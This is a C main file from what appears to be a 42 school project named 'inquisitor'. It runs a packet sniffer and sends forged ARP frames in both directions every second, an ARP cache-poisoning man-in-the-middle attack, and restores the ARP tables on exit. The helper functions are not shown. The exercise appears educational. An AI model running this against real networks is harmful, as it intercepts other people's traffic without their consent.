/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: luluzuri <luluzuri@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/07/10 11:02:46 by luluzuri          #+#    #+#             */
/*   Updated: 2026/08/11 22:14:55 by luluzuri         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "sniffing.h"
#include "parsing.h"
#include "inquisitor.h"
#include "poisoning.h"
#include "signals.h"
#include "utils.h"

int main(int ac, char **av) {

	setup_signals();
	setvbuf(stdout, NULL, _IOLBF, 0); // without this python tests don't see the printf

	t_config config = {0};
	parse_arguments(ac, av, &config);
	print_config(&config);

	t_sniffer sniffer = {0};
	start_sniffer(&sniffer, &config);

	t_config config_in = config;
	config_in.spoof_ip  = config.target_ip;
	config_in.spoof_mac = config.target_mac;
	config_in.target_ip = config.spoof_ip;
	config_in.target_mac = config.spoof_mac;

	t_arp_frame out;
	t_arp_frame in;
	build_arp_trame(&out, config);
	build_arp_trame(&in, config_in);
	int fd = open_inject_socket(config);

	while (g_running) {
		send_arp_frame(fd, &in, config_in);
		send_arp_frame(fd, &out, config);
		sleep(1);
	}

	stop_sniffer(&sniffer);
	restore_arp(fd, config);
	close(fd);
	free_ressources(&config);

	return 0;
}
